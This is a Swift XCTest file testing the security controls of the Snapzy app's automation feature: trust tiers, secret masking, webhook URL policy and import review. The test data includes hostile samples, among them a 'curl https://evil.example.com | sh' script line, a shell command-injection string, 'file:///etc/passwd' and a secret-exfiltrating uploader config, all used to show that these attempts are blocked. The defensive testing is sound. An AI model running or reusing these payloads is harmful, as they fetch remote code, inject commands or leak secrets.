//
//  AutomationIntegrationTests.swift
//  SnapzyTests
//
//  Milestone 4: trust tiers at launch, secrets (resolution, masking, store),
//  the review flag on import, webhook / script / Shortcut / share / open steps
//  against the fake environment, TOML round-trips of the new steps, and the
//  script runner's no-interpolation guarantee with a real shell.
//

import XCTest
@testable import Snapzy

@MainActor
final class AutomationIntegrationTests: XCTestCase {
  private var suiteName: String!
  private var defaults: UserDefaults!
  private var store: AutomationStore!
  private var environment: FakeAutomationEnvironment!
  private var runner: AutomationRunner!
  private var codeAllowed = false
  private var launcher: AutomationLauncher!
  private var directory: URL!
  private var image: URL!

  override func setUpWithError() throws {
    try super.setUpWithError()
    suiteName = "AutomationIntegrationTests.\(UUID().uuidString)"
    defaults = UserDefaults(suiteName: suiteName)
    defaults.set(true, forKey: PreferencesKeys.automationsSeeded)
    store = AutomationStore(defaults: defaults)
    environment = FakeAutomationEnvironment()
    runner = AutomationRunner(environment: environment, frontmostAppName: { "Safari" })
    codeAllowed = false
    launcher = AutomationLauncher(
      store: store,
      runner: runner,
      isURLSchemeEnabled: { true },
      allowsCodeSteps: { [unowned self] in codeAllowed }
    )
    directory = FileManager.default.temporaryDirectory.appendingPathComponent("AutomationIntegrationTests-\(UUID().uuidString)")
    try FileManager.default.createDirectory(at: directory, withIntermediateDirectories: true)
    image = directory.appendingPathComponent("shot.png")
    try AutomationTestImages.png(width: 40, height: 30).write(to: image)
  }

  override func tearDownWithError() throws {
    try? FileManager.default.removeItem(at: directory)
    defaults.removePersistentDomain(forName: suiteName)
    try super.tearDownWithError()
  }

  private func automation(
    _ steps: [AutomationStepAction],
    source: AutomationSource = .input,
    external: Bool = false
  ) -> Automation {
    Automation(name: "Test", source: source, steps: steps.map { AutomationStep($0) }, externalInvocation: external)
  }

  private func rejection(_ outcome: AutomationLaunchOutcome) -> AutomationLaunchRejection? {
    if case .rejected(let rejection) = outcome { return rejection }
    return nil
  }

  private var script: AutomationStepAction {
    .runScript(AutomationRunScriptConfig(script: "echo hi"))
  }

  private var webhook: AutomationStepAction {
    .webhook(AutomationWebhookConfig(url: "https://hooks.example.com/x"))
  }

  // MARK: - Trust tiers

  func testTierOfStepsAndAutomation() {
    XCTAssertEqual(AutomationTrust.tier(of: .copyImage), .local)
    XCTAssertEqual(AutomationTrust.tier(of: webhook), .network)
    XCTAssertEqual(AutomationTrust.tier(of: .upload(AutomationUploadConfig())), .network)
    XCTAssertEqual(AutomationTrust.tier(of: script), .code)
    XCTAssertEqual(AutomationTrust.tier(of: .runShortcut(AutomationRunShortcutConfig(name: "X"))), .code)
    XCTAssertEqual(AutomationTrust.tier(of: .shareSheet(AutomationShareSheetConfig())), .local)

    var mixed = automation([.copyImage, webhook, script])
    XCTAssertEqual(mixed.maxTrust, .code)
    mixed.steps[2].isEnabled = false
    XCTAssertEqual(mixed.maxTrust, .network, "Disabled steps don't count")
  }

  func testCodeStepsRefusedUntilAllowed() async {
    let added = automation([script], external: true)
    store.add(added)

    let refused = await launcher.launch(.id(added.id), invocation: .cli, input: AutomationInput(files: [image], isAlreadyInHistory: false))
    XCTAssertEqual(rejection(refused), .codeStepsDisabled)
    XCTAssertTrue(environment.processRequests.isEmpty)

    codeAllowed = true
    let ran = await launcher.launch(.id(added.id), invocation: .cli, input: AutomationInput(files: [image], isAlreadyInHistory: false))
    XCTAssertNil(rejection(ran), "CLI callers are approved per app; no second opt-in")
  }

  func testExternalCodeNeedsSecondOptIn() async {
    codeAllowed = true
    var added = automation([script], source: .capture(AutomationCaptureSpec(mode: .area, saveToExportDirectory: false)), external: true)
    store.add(added)

    for invocation in [AutomationInvocation.urlScheme, .appIntent] {
      let outcome = await launcher.launch(.id(added.id), invocation: invocation)
      XCTAssertEqual(rejection(outcome), .externalCodeNotAllowed, "\(invocation)")
    }

    added.allowExternalCode = true
    store.update(added)
    XCTAssertTrue(store.automation(id: added.id)?.allowExternalCode == true)
    let outcome = await launcher.launch(.id(added.id), invocation: .urlScheme)
    XCTAssertNotEqual(rejection(outcome), .externalCodeNotAllowed)
  }

  func testSecondOptInDroppedWithoutExternalInvocation() {
    var candidate = automation([script])
    candidate.allowExternalCode = true
    XCTAssertFalse(candidate.normalized().allowExternalCode)
  }

  func testNeedsReviewRefusedFirst() async {
    var added = automation([webhook])
    added.needsReview = true
    store.add(added)

    let outcome = await launcher.launch(.id(added.id), invocation: .menuBar, input: AutomationInput(files: [image], isAlreadyInHistory: false))
    XCTAssertEqual(rejection(outcome), .needsReview)
    XCTAssertTrue(environment.sentRequests.isEmpty)
  }

  func testRunnerAlsoRefusesCodeStepWhenDisabled() async throws {
    environment.codeStepsAllowed = false
    let result = try unwrapRun(await runner.run(automation([script]), files: [image]))
    XCTAssertTrue(result.isError)
    XCTAssertTrue(environment.processRequests.isEmpty)
  }

  // MARK: - Review flag

  func testImportFlagsSensitiveStepsAndKeepsReviewedOnes() {
    let local = automation([.copyImage, .notify])
    XCTAssertFalse(local.flaggedForReview(comparedTo: nil).needsReview)

    let defaultUpload = automation([.upload(AutomationUploadConfig()), .copyLink(AutomationLinkTemplate())])
    XCTAssertFalse(defaultUpload.flaggedForReview(comparedTo: nil).needsReview, "Own cloud needs no review")

    let customUpload = automation([.upload(AutomationUploadConfig(destination: .customUploader(UUID())))])
    XCTAssertTrue(customUpload.flaggedForReview(comparedTo: nil).needsReview)

    let incoming = automation([webhook])
    XCTAssertTrue(incoming.flaggedForReview(comparedTo: nil).needsReview, "New sensitive automation")

    var stored = incoming
    stored.needsReview = false
    XCTAssertFalse(incoming.flaggedForReview(comparedTo: stored).needsReview, "Unchanged since the review")

    var changed = incoming
    changed.steps[0].content = .action(.webhook(AutomationWebhookConfig(url: "https://evil.example.com")))
    XCTAssertTrue(changed.flaggedForReview(comparedTo: stored).needsReview)

    var external = incoming
    external.externalInvocation = true
    XCTAssertTrue(external.flaggedForReview(comparedTo: stored).needsReview, "Opening it to other apps needs a review")

    var pending = stored
    pending.needsReview = true
    XCTAssertTrue(incoming.flaggedForReview(comparedTo: pending).needsReview, "Stays flagged until reviewed")
  }

  func testImportNeverTakesSecondOptInFromFile() {
    var incoming = automation([script], external: true)
    incoming.allowExternalCode = true
    XCTAssertFalse(incoming.flaggedForReview(comparedTo: nil).allowExternalCode)

    var stored = automation([script], external: true)
    stored.id = incoming.id
    stored.allowExternalCode = true
    XCTAssertTrue(incoming.flaggedForReview(comparedTo: stored).allowExternalCode, "Kept from this Mac")
  }

  func testTOMLImportFlagsScriptAgainstStoredNotFileData() throws {
    let id = UUID()
    var forged = automation([script])
    forged.id = id
    forged.needsReview = false
    forged.allowExternalCode = true
    let data = String(data: try JSONEncoder().encode(forged), encoding: .utf8)!
      .replacingOccurrences(of: "\\", with: "\\\\")
      .replacingOccurrences(of: "\"", with: "\\\"")
    let toml = """
    [automations.\(id.uuidString.lowercased())]
    name = "Forged"
    data = "\(data)"
    capture = "input"
    external_invocation = true

    [automations.\(id.uuidString.lowercased()).steps.01]
    kind = "run_script"
    script = "curl https://evil.example.com | sh"
    """
    let document = try SimpleTOMLParser.parse(toml)
    let result = SnapzyConfigurationAutomationsCodec.parse(document, storedAutomation: { _ in nil })
    let imported = try XCTUnwrap(result.automations?.first)

    XCTAssertTrue(imported.needsReview, "The file's own data cannot vouch for itself")
    XCTAssertFalse(imported.allowExternalCode)
    XCTAssertTrue(result.warnings.contains { $0.contains("save to allow it") })
  }

  // MARK: - Secrets

  func testMaskReplacesLongestValuesFirstAndSkipsTinyOnes() {
    let masked = AutomationSecretStore.mask("token abc123 and abc123xyz and ab", values: ["abc123", "abc123xyz", "ab"])
    XCTAssertEqual(masked, "token •••• and •••• and ab")
  }

  func testRenderResolvesSecretsOnlyFromTheTemplate() throws {
    let variables = AutomationVariables(values: ["{text}": "{secret:API_KEY}"])
    let rendered = try variables.renderAllowingSecrets(
      "Bearer {secret:API_KEY} / {text}",
      resolveSecret: { $0 == "API_KEY" ? "s3cr3t" : nil }
    )
    XCTAssertEqual(rendered.text, "Bearer s3cr3t / {secret:API_KEY}", "A payload value is never resolved")
    XCTAssertEqual(rendered.secrets, ["s3cr3t"])

    XCTAssertThrowsError(try variables.renderAllowingSecrets("{secret:MISSING}", resolveSecret: { _ in nil })) {
      XCTAssertEqual($0 as? AutomationStepError, .secretMissing("MISSING"))
    }
  }

  func testSecretStoreKeepsValuesOutOfDefaults() throws {
    let keychain = InMemoryKeychain()
    let secrets = AutomationSecretStore(defaults: defaults, keychain: keychain)
    try secrets.set(name: "SLACK", value: "https://hooks.slack.com/T/B/xyz")
    try secrets.set(name: "SLACK", value: "https://hooks.slack.com/T/B/new")

    XCTAssertEqual(secrets.names, ["SLACK"])
    XCTAssertEqual(secrets.value(for: "SLACK"), "https://hooks.slack.com/T/B/new")
    let index = String(data: defaults.data(forKey: PreferencesKeys.automationSecrets) ?? Data(), encoding: .utf8) ?? ""
    XCTAssertFalse(index.contains("hooks.slack.com"), "Only names and Keychain accounts in UserDefaults")

    XCTAssertThrowsError(try secrets.set(name: "bad name", value: "x"))
    XCTAssertThrowsError(try secrets.set(name: "EMPTY", value: ""))

    try secrets.rename("SLACK", to: "SLACK_HOOK")
    XCTAssertEqual(secrets.value(for: "SLACK_HOOK"), "https://hooks.slack.com/T/B/new")
    secrets.delete(name: "SLACK_HOOK")
    XCTAssertTrue(secrets.names.isEmpty)
    XCTAssertTrue(keychain.items.isEmpty)
  }

  // MARK: - Chain validation

  func testValidatorReportsMissingIntegrationSettings() {
    func fields(_ action: AutomationStepAction) -> [AutomationChainIssue.Reason] {
      AutomationChainValidator.validate(
        automation([action]),
        uploaderExists: { _ in false },
        secretExists: { $0 == "KNOWN" }
      ).map(\.reason)
    }

    XCTAssertEqual(fields(.webhook(AutomationWebhookConfig(url: "http://example.com"))), [.missingConfig(.webhookURL)])
    XCTAssertEqual(fields(.webhook(AutomationWebhookConfig(url: "http://localhost:8080/hook"))), [])
    XCTAssertEqual(fields(.webhook(AutomationWebhookConfig(url: "{secret:KNOWN}"))), [])
    XCTAssertEqual(
      fields(.webhook(AutomationWebhookConfig(url: "https://x.example", headers: [.init(name: "Authorization", value: "Bearer {secret:NOPE}")]))),
      [.missingConfig(.secret("NOPE"))]
    )
    XCTAssertEqual(fields(.runScript(AutomationRunScriptConfig(script: "  "))), [.missingConfig(.script)])
    XCTAssertEqual(fields(.runShortcut(AutomationRunShortcutConfig())), [.missingConfig(.shortcut)])
    XCTAssertEqual(fields(.openInApp(AutomationOpenInAppConfig())), [.missingConfig(.app)])
    XCTAssertEqual(fields(.upload(AutomationUploadConfig(destination: .customUploader(UUID())))), [.missingConfig(.uploader)])
  }

  // MARK: - Webhook

  func testWebhookPostsJSONEscapedPayloadWithSecretHeader() async throws {
    environment.secrets = ["TOKEN": "tok-123456"]
    environment.sendBody = Data(#"{"data":{"url":"https://short.example/abc"}}"#.utf8)
    let config = AutomationWebhookConfig(
      url: "https://hooks.example.com/post?user={automation}",
      headers: [.init(name: "Authorization", value: "Bearer {secret:TOKEN}")],
      jsonTemplate: #"{"text": "{text}"}"#,
      responseLinkPath: "data.url"
    )
    environment.recognizedText = "He said \"hi\"\nbye"
    let result = try unwrapRun(await runner.run(automation([.ocr(AutomationOCRConfig()), .webhook(config)]), files: [image]))
    let state = result.state

    let request = try XCTUnwrap(environment.sentRequests.last)
    XCTAssertEqual(request.url?.absoluteString, "https://hooks.example.com/post?user=Test")
    XCTAssertEqual(request.httpMethod, "POST")
    XCTAssertEqual(request.value(forHTTPHeaderField: "Authorization"), "Bearer tok-123456")
    let body = try XCTUnwrap(request.httpBody)
    let decoded = try XCTUnwrap(JSONSerialization.jsonObject(with: body) as? [String: String])
    XCTAssertEqual(decoded["text"], "He said \"hi\"\nbye", "Quotes and newlines survive as JSON")
    XCTAssertEqual(state.payload.link?.absoluteString, "https://short.example/abc")
    XCTAssertFalse(result.isError)
  }

  func testWebhookFailureMasksSecretsAndRejectsPlainHTTP() async throws {
    environment.secrets = ["HOOK": "https://hooks.example.com/secret-path"]
    environment.sendStatus = 403
    environment.sendBody = Data("denied for https://hooks.example.com/secret-path".utf8)
    let failed = try unwrapRun(await runner.run(
      automation([.webhook(AutomationWebhookConfig(url: "{secret:HOOK}", bodyKind: .none))]),
      files: [image]
    ))
    XCTAssertTrue(failed.isError)
    XCTAssertFalse(failed.message.contains("secret-path"), failed.message)
    XCTAssertTrue(failed.state.secretValues.contains("https://hooks.example.com/secret-path"))
    let record = try XCTUnwrap(environment.runRecords.last)
    XCTAssertFalse(record.steps.contains { $0.error?.contains("secret-path") == true })

    environment.secrets = ["HOOK": "http://evil.example.com/x"]
    let before = environment.sentRequests.count
    let plain = try unwrapRun(await runner.run(
      automation([.webhook(AutomationWebhookConfig(url: "{secret:HOOK}"))]),
      files: [image]
    ))
    XCTAssertTrue(plain.isError)
    XCTAssertEqual(environment.sentRequests.count, before, "Never sent over plain HTTP")
  }

  func testWebhookPolicy() {
    XCTAssertNotNil(AutomationWebhookPolicy.validatedURL("https://example.com/hook"))
    XCTAssertNotNil(AutomationWebhookPolicy.validatedURL("http://localhost:3000/hook"))
    XCTAssertNotNil(AutomationWebhookPolicy.validatedURL("http://127.0.0.1/hook"))
    XCTAssertNil(AutomationWebhookPolicy.validatedURL("http://example.com/hook"))
    XCTAssertNil(AutomationWebhookPolicy.validatedURL("http://localhost.evil.com/hook"))
    XCTAssertNil(AutomationWebhookPolicy.validatedURL("file:///etc/passwd"))
    XCTAssertNil(AutomationWebhookPolicy.validatedURL("javascript:alert(1)"))
  }

  // MARK: - Script / Shortcut

  func testScriptGetsValuesThroughEnvironmentOnly() async throws {
    environment.codeStepsAllowed = true
    environment.processOutcome = ProcessOutcome(
      status: 0, stdout: Data("https://out.example/1\n".utf8), stderr: Data(), timedOut: false, truncated: false
    )
    let config = AutomationRunScriptConfig(script: #"echo "$SNAPZY_FILE""#, output: .link)
    let result = try unwrapRun(await runner.run(automation([.runScript(config)]), files: [image]))

    let request = try XCTUnwrap(environment.processRequests.first)
    XCTAssertEqual(request.executable.path, "/bin/zsh")
    XCTAssertEqual(Array(request.arguments.prefix(4)), ["-f", "-c", #"echo "$SNAPZY_FILE""#, "snapzy"])
    XCTAssertEqual(request.arguments.last, request.environment["SNAPZY_FILE"])
    XCTAssertEqual(request.environment["SNAPZY_AUTOMATION"], "Test")
    XCTAssertNotNil(request.environment["SNAPZY_RUN_ID"])
    XCTAssertEqual(result.state.payload.link?.absoluteString, "https://out.example/1")
  }

  func testScriptNonZeroExitFails() async throws {
    environment.codeStepsAllowed = true
    environment.processOutcome = ProcessOutcome(
      status: 2, stdout: Data(), stderr: Data("boom".utf8), timedOut: false, truncated: false
    )
    let result = try unwrapRun(await runner.run(automation([.runScript(AutomationRunScriptConfig(script: "exit 2"))]), files: [image]))
    XCTAssertTrue(result.isError)
    XCTAssertTrue(environment.runRecords.last?.steps.first?.error?.contains("boom") == true)
  }

  func testRealShellNeverInterpolatesPayload() async throws {
    let marker = directory.appendingPathComponent("pwned")
    let hostile = "$(touch \(marker.path)) `touch \(marker.path)` ; touch \(marker.path)"
    let request = AutomationScriptInvocation.request(
      config: AutomationRunScriptConfig(script: #"printf '%s' "$SNAPZY_TEXT""#),
      files: [],
      environment: ["SNAPZY_TEXT": hostile],
      workingDirectory: directory
    )
    let outcome = try await ProcessRunner.run(request)
    XCTAssertEqual(outcome.status, 0)
    XCTAssertEqual(outcome.stdoutText, hostile)
    XCTAssertFalse(FileManager.default.fileExists(atPath: marker.path))
  }

  func testProcessRunnerTimesOutAndKills() async throws {
    let started = Date()
    let outcome = try await ProcessRunner.run(ProcessRequest(
      executable: URL(fileURLWithPath: "/bin/sh"),
      arguments: ["-c", "sleep 30"],
      environment: ProcessRunner.baseEnvironment(),
      timeout: 0.5
    ))
    XCTAssertTrue(outcome.timedOut)
    XCTAssertLessThan(Date().timeIntervalSince(started), 10)
  }

  func testShortcutRunsWithInputAndOutputPaths() async throws {
    environment.codeStepsAllowed = true
    let config = AutomationRunShortcutConfig(name: "Post to Notion", input: .file, output: .ignore)
    let result = try unwrapRun(await runner.run(automation([.runShortcut(config)]), files: [image]))

    XCTAssertFalse(result.isError, result.message)
    let request = try XCTUnwrap(environment.processRequests.first)
    XCTAssertEqual(request.executable.path, "/usr/bin/shortcuts")
    XCTAssertEqual(Array(request.arguments.prefix(2)), ["run", "Post to Notion"])
    XCTAssertTrue(request.arguments.contains("--input-path"))
  }

  func testShortcutNotFoundMessage() async throws {
    environment.codeStepsAllowed = true
    environment.processOutcome = ProcessOutcome(
      status: 1, stdout: Data(), stderr: Data("Error: Couldn't find shortcut".utf8), timedOut: false, truncated: false
    )
    let result = try unwrapRun(await runner.run(automation([.runShortcut(AutomationRunShortcutConfig(name: "Nope"))]), files: [image]))
    XCTAssertTrue(result.isError)
    XCTAssertEqual(environment.runRecords.last?.steps.first?.error, AutomationStepError.shortcutNotFound("Nope").localizedDescription)
  }

  // MARK: - Share / open in app

  func testShareAndOpenHandOverTheFile() async throws {
    let result = try unwrapRun(await runner.run(
      automation([
        .shareSheet(AutomationShareSheetConfig(service: .airDrop)),
        .openInApp(AutomationOpenInAppConfig(appBundleID: "com.apple.Preview", appName: "Preview")),
      ]),
      files: [image]
    ))
    XCTAssertFalse(result.isError, result.message)
    XCTAssertEqual(environment.shared.first?.1, .airDrop)
    XCTAssertEqual((environment.shared.first?.0.first as? URL)?.lastPathComponent, image.lastPathComponent)
    XCTAssertEqual(environment.opened.first?.1, "com.apple.Preview")
  }

  func testShareServiceTokens() throws {
    for service in [AutomationShareService.picker, .airDrop, .messages, .mail, .named("com.apple.share.Twitter.post")] {
      let data = try JSONEncoder().encode(AutomationShareSheetConfig(service: service))
      XCTAssertEqual(try JSONDecoder().decode(AutomationShareSheetConfig.self, from: data).service, service)
    }
    XCTAssertEqual(AutomationShareService(token: "AirDrop"), .airDrop)
    XCTAssertEqual(AutomationShareService(token: ""), .picker)
  }

  // MARK: - Review findings

  func testSXCUImportCannotReferenceStoredSecrets() throws {
    let json = """
    {"Name": "Evil", "RequestMethod": "POST", "RequestURL": "https://evil.example/u?k={secret:SLACK_WEBHOOK}",
     "Headers": {"X-A": "{secret:API_TOKEN}", "X-B": "$secret:OTHER$"}, "Body": "MultipartFormData",
     "FileFormName": "file", "URL": "{json:url}"}
    """
    let result = try CustomUploaderSXCUImporter.importUploader(from: Data(json.utf8))
    let uploader = result.uploader
    let everything = ([uploader.url] + uploader.headers.map(\.value)).joined(separator: " ")
    XCTAssertFalse(everything.contains("secret"), everything)
    XCTAssertTrue(result.warnings.contains { if case .removedSecret = $0 { return true } else { return false } })
  }

  func testUploaderRedirectPolicy() {
    let https = URL(string: "https://up.example.com/upload")
    XCTAssertTrue(CustomUploaderRedirectPolicy.allows(from: https, to: URL(string: "https://up.example.com/v2/upload")))
    XCTAssertFalse(CustomUploaderRedirectPolicy.allows(from: https, to: URL(string: "https://evil.example.com/upload")))
    XCTAssertFalse(CustomUploaderRedirectPolicy.allows(from: https, to: URL(string: "http://up.example.com/upload")))
    XCTAssertTrue(CustomUploaderRedirectPolicy.allows(from: URL(string: "http://localhost:3000/u"), to: URL(string: "https://localhost:3000/u")))
  }

  // MARK: - TOML

  func testTOMLRoundTripsIntegrationSteps() throws {
    var original = automation([
      .upload(AutomationUploadConfig(destination: .customUploader(UUID()))),
      .webhook(AutomationWebhookConfig(
        method: .put,
        url: "{secret:HOOK}",
        headers: [.init(name: "X-Token", value: "{secret:TOKEN}")],
        bodyKind: .multipart,
        fields: [.init(name: "note", value: "a=b {text}")],
        fileField: "upload",
        timeout: 45,
        responseToText: true,
        responseLinkPath: "files[0].url"
      )),
      .runScript(AutomationRunScriptConfig(script: "set -e\necho \"$SNAPZY_FILE\"", shell: .bash, useLoginShell: true, timeout: 90, output: .file)),
      .runShortcut(AutomationRunShortcutConfig(name: "Resize", input: .text, output: .text, timeout: 20)),
      .shareSheet(AutomationShareSheetConfig(service: .messages)),
      .openInApp(AutomationOpenInAppConfig(appBundleID: "com.apple.Preview", appName: "Preview")),
    ])
    original.needsReview = false

    var writer = SimpleTOMLWriter()
    SnapzyConfigurationAutomationsCodec.write([original], to: &writer)
    let text = writer.output
    XCTAssertFalse(text.contains("tok-"), "Only references are written")

    let parsed = SnapzyConfigurationAutomationsCodec.parse(
      try SimpleTOMLParser.parse(text),
      storedAutomation: { _ in original }
    )
    XCTAssertEqual(parsed.warnings, [])
    let imported = try XCTUnwrap(parsed.automations?.first)
    XCTAssertEqual(imported.steps.map(\.action), original.steps.map(\.action))
    XCTAssertFalse(imported.needsReview, "Re-importing what this Mac exported needs no review")
  }

  func testTOMLWarnsOnBadIntegrationValues() throws {
    let id = UUID().uuidString.lowercased()
    let toml = """
    [automations.\(id)]
    name = "Bad"
    capture = "input"

    [automations.\(id).steps.01]
    kind = "webhook"
    url = "http://example.com"
    method = "TRACE"
    headers = ["no separator"]

    [automations.\(id).steps.02]
    kind = "upload"
    destination = "somewhere"
    """
    let parsed = SnapzyConfigurationAutomationsCodec.parse(try SimpleTOMLParser.parse(toml), storedAutomation: { _ in nil })
    XCTAssertTrue(parsed.warnings.contains { $0.contains("must start with https://") })
    XCTAssertTrue(parsed.warnings.contains { $0.contains("method") })
    XCTAssertTrue(parsed.warnings.contains { $0.contains("headers") })
    XCTAssertTrue(parsed.warnings.contains { $0.contains("destination") })
  }
}

/// Keychain double for `AutomationSecretStore`.
private final class InMemoryKeychain: KeychainPasswordStoring, @unchecked Sendable {
  var items: [String: String] = [:]

  func read(account: String) -> String? { items[account] }

  func save(_ value: String, account: String) throws { items[account] = value }

  func delete(account: String) { items[account] = nil }
}

/// `XCTUnwrap` takes an autoclosure, which can't hold an `await`.
private func unwrapRun<T>(_ value: T?, file: StaticString = #filePath, line: UInt = #line) throws -> T {
  try XCTUnwrap(value, file: file, line: line)
}
